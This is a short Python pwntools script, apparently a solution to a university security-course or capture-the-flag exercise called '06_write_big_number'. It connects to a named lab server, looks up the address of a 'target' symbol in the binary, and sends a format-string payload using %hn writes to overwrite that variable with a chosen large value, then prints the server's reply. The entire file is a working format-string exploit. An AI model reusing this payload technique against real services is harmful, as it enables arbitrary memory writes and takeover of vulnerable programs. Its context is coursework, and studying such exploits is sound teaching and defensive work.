from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23196

s = remote(SERVER, PORT, timeout=9999)
elf = ELF("./06_write_big_number")

target_address = elf.symbols["target"]

s.sendline(
    p32(target_address)
    + p32(target_address + 2)
    + b"%48871x"
    + b"%7$hn"
    + b"%8126x"
    + b"%8$hn"
)

s.recvline()
s.recvline()
response = s.recvline()
print(response.decode())
